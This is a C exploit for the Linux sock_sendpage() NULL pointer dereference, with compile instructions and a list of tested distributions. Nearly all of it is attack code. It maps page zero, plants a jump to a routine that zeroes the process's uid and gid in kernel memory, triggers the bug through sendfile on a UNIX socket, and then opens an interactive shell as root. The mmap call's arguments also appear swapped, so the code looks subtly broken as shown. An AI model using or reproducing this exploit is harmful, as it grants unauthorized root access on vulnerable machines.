/*
 *  Linux PF_UNIX or PF_BLUETOOTH sock_sendpage() NULL pointer deref x86_64/x86/x64/PPC and PPC64
 *  ****PF_UNIX socket-vector
 *
 * Exploit was tested on:
 * CentOS 5.7 (2.6.18-274.el5)
 * Red Hat Enterprise Linux 5.7 (2.6.18-274.6.1.el5)
 * SUSE Linux Enterprise Server 11 (2.6.27.19-5)
 * Ubuntu 11.10 (Latest 2011) - Mixed results,depends on the version of kernel.. 2.6.32.6 seems abit better
 *
 * For i386 and PPC i386, compile with the following command:
 * gcc -Wall -o sendpage sendpage.c
 * And for x86_64 and PPC64:
 * gcc -Wall -m64 -o sendpage sendpage.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <unistd.h>

#define PAGE_SIZE getpagesize()  // PAGE_SIZE only need this if the kernel doesnt have header,so maybe // out to

//#ifndef PF_UNIX
//#define PF_UNIX AF_UNIX
//#define AF_UNIX 11             // Adjust this... some boxes will want this IN
//#endif

#if !defined(__always_inline)
#define __always_inline inline __attribute__((always_inline))
#endif
#if defined(__i386__) || defined(__x86_64__)
#if defined(__LP64__)
static __always_inline unsigned long current_stack_pointer(void) {
	unsigned long sp;
	asm volatile ("movq %%rsp,%0; " : "=r" (sp));
	return sp;
}
#else
static __always_inline unsigned long current_stack_pointer(void) {
	unsigned long sp;
	asm volatile ("movl %%esp,%0" : "=r" (sp));
	return sp;
}
#endif
#elif defined(__powerpc__) || defined(__powerpc64__)
static __always_inline unsigned long current_stack_pointer(void) {
	unsigned long sp;
	asm volatile ("mr %0,%%r1; " : "=r" (sp));
	return sp;
}
#endif
#if defined(__i386__) || defined(__x86_64__)
#if defined(__LP64__)
static __always_inline unsigned long current_task_struct(void) {
	unsigned long task_struct;
	asm volatile ("movq %%gs:(0),%0; " : "=r" (task_struct));
	return task_struct;
}
#else
static __always_inline unsigned long current_task_struct(void) {
	unsigned long task_struct, thread_info;
	thread_info = current_stack_pointer() & ~(4096 - 1);
	if (*(unsigned long *)thread_info >= 0xc0000000) {
	task_struct = *(unsigned long *)thread_info;
	if (*(unsigned long *)task_struct == 0)
	return task_struct;
	}
	task_struct = current_stack_pointer() & ~(8192 - 1);
	if (*(unsigned long *)task_struct == 0)
	return task_struct;
	thread_info = task_struct;
	task_struct = *(unsigned long *)thread_info;
	if (*(unsigned long *)task_struct == 0)
	return task_struct;
	return -1;
}
#endif
#elif defined(__powerpc__) || defined(__powerpc64__)
static __always_inline unsigned long current_task_struct(void) {
	unsigned long task_struct, thread_info;
#if defined(__LP64__)
	task_struct = current_stack_pointer() & ~(16384 - 1);
#else
	task_struct = current_stack_pointer() & ~(8192 - 1);
#endif
	if (*(unsigned long *)task_struct == 0)
	return task_struct;
	thread_info = task_struct;
	task_struct = *(unsigned long *)thread_info;
	if (*(unsigned long *)task_struct == 0)
	return task_struct;
	return -1;
}
#endif
#if defined(__i386__) || defined(__x86_64__)
static unsigned long uid, gid;
static int change_cred(void) {
	unsigned int *task_struct;
	task_struct = (unsigned int *)current_task_struct();
	while (task_struct) {
	if (task_struct[0] == uid && task_struct[1] == uid &&
	task_struct[2] == uid && task_struct[3] == uid &&
	task_struct[4] == gid && task_struct[5] == gid &&
	task_struct[6] == gid && task_struct[7] == gid) {
	task_struct[0] = task_struct[1] = task_struct[2] = task_struct[3] =task_struct[4] = task_struct[5] =
	task_struct[6] = task_struct[7] = 0;
	break;
	}
	task_struct++;
	}
	return -1;
}
#elif defined(__powerpc__) || defined(__powerpc64__)
static int change_cred(void) {
	unsigned int *task_struct;
	task_struct = (unsigned int *)current_task_struct();
	while (task_struct) {
	if (!task_struct[0]) {
	task_struct++;
	continue;
	}
	if(task_struct[0]==task_struct[1]&&task_struct[0]==task_struct[2]&&
	task_struct[0]==task_struct[3]&&task_struct[4]==task_struct[5]&&
	task_struct[4]==task_struct[6]&&task_struct[4]==task_struct[7]) {
        task_struct[0]=task_struct[1]=task_struct[2]=task_struct[3]=task_struct[4]=
        task_struct[5]=task_struct[6]=task_struct[7]=0;
	break;
	}
	task_struct++;
	}
	return -1;
}
#endif

int main(void) {
	char *addr;
	int out_fd, in_fd;
	char template[] = "/tmp/fdlist.SUX";
#if defined(__i386__) || defined(__x86_64__)
	uid = getuid(), gid = getgid();
#endif
        if((addr=mmap(PAGE_SIZE,NULL,PROT_READ|PROT_WRITE,MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,0,0))==MAP_FAILED){
	perror("-> failed to mmap");
	exit(EXIT_FAILURE);
	}
#if defined(__i386__) || defined(__x86_64__)
#if defined(__LP64__)
	addr[0] = '\xff';
	addr[1] = '\x24';
	addr[2] = '\x25';
	*(unsigned long *)&addr[3] = 8;
	*(unsigned long *)&addr[8] = (unsigned long)change_cred;
#else
	addr[0] = '\xff';
	addr[1] = '\x25';
	*(unsigned long *)&addr[2] = 8;
	*(unsigned long *)&addr[8] = (unsigned long)change_cred;
#endif
#elif defined(__powerpc__) || defined(__powerpc64__)
#if defined(__LP64__)
	*(unsigned long *)&addr[0] = *(unsigned long *)change_cred;
#else
	addr[0] = '\x3f';
	addr[1] = '\xe0';
	*(unsigned short *)&addr[2] = (unsigned short)change_cred>>16;
	addr[4] = '\x63';
	addr[5] = '\xff';
	*(unsigned short *)&addr[6] = (unsigned short)change_cred;
	addr[8] = '\x7f';
	addr[9] = '\xe9';
	addr[10] = '\x03';
	addr[11] = '\xa6';
	addr[12] = '\x4e';
	addr[13] = '\x80';
	addr[14] = '\x04';
	addr[15] = '\x20';
#endif
#endif
	if ((out_fd = socket(PF_UNIX, SOCK_DGRAM, 0)) == -1) {
	perror("-> socket");
	exit(EXIT_FAILURE);
	}
	if ((in_fd = mkstemp(template)) == -1) {
	perror("-> mkstemp");
	exit(EXIT_FAILURE);
	}
	if(unlink(template) == -1) {
	perror("-> unlink");
	exit(EXIT_FAILURE);
	}
	if (ftruncate(in_fd, PAGE_SIZE) == -1) {
	perror("-> ftruncate");
	exit(EXIT_FAILURE);
	}
	sendfile(out_fd, in_fd, NULL, PAGE_SIZE);
	execl("/bin/sh", "/bin/sh", "-i", NULL);
	exit(EXIT_SUCCESS);
}